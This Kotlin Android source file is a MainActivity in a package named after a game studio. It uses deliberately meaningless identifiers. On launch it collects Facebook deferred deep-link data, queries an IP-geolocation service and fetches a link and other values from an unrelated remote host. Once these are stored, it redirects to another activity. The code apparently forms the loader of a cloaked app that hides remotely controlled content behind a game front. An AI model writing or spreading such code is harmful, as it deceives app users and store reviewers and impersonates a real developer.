package com.hutchgames.cccgo.guhthtghugt

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.facebook.applinks.AppLinkData
import com.hutchgames.cccgo.ggihgthugt.SortOneActivity
import com.hutchgames.cccgo.databinding.ActivityMainBinding
import com.hutchgames.cccgo.fgtfrfrgrf.PapaClass
import com.hutchgames.cccgo.fgtfrfrgrf.PapaClass.Companion.gtngtugthugt
import com.hutchgames.cccgo.fgtfrfrgrf.PapaClass.Companion.gtgth
import com.hutchgames.cccgo.frrjirf.ServiceApi
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {



    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        deddeede = ActivityMainBinding.inflate(layoutInflater)
        setContentView(deddeede.root)

        hyohyiyiyi(this)

        val gttgt = Executors.newSingleThreadScheduledExecutor()
        var gtthhy: String? = Hawk.get(gtngtugthugt, null)
        var gthyhhy: String? = Hawk.get(gtgth, null)
        gttgt.scheduleAtFixedRate({
            if (gtthhy != null && gthyhhy != null) {
                gttgt.shutdown()
                jgitjuthtt()
            } else {
                gtthhy = Hawk.get(gtngtugthugt)
                gthyhhy = Hawk.get(gtgth)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            nvnghghthty
        }
    }


    private lateinit var deddeede: ActivityMainBinding

    private suspend fun gtjotgjgtjgtjigtj() {

        val frfrghy = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://silkaugustin.art/")
            .build()
            .create(ServiceApi::class.java)
        val linkViewfrgtt = frfrghy.UOUOUOUO().body()?.gttgtgttg.toString()
        val frfgtgt = frfrghy.UOUOUOUO().body()?.yhyhyjujuuj.toString()
        val frgtt = frfrghy.UOUOUOUO().body()?.jujujujujuj.toString()


        Hawk.put(PapaClass.gthgthgt, linkViewfrgtt)
        Hawk.put(PapaClass.gtngtgtgt, frfgtgt)
        Hawk.put(gtgth, frgtt)


    }

    private suspend fun gtjigtgthugt() {
        val gtjigtjigtjitg = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceApi::class.java)
        val gtjgthugthugt = gtjigtjigtjitg.poopopop().body()?.ololololo

        Hawk.put(gtngtugthugt, gtjgthugthugt)
    }

    private val nvnghghthty: Job = GlobalScope.launch(Dispatchers.IO) {
        gtjigtgthugt()
        gtjotgjgtjgtjigtj()
    }

    fun hyohyiyiyi(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val opopopop = appLinkData.targetUri?.host.toString()
                Hawk.put(PapaClass.hykpokkhykkhy, opopopop)
            }
        }
    }

    private fun jgitjuthtt() {
        val iiiiiiii = Intent(this@MainActivity, SortOneActivity::class.java)
        startActivity(iiiiiiii)
        finish()
    }


}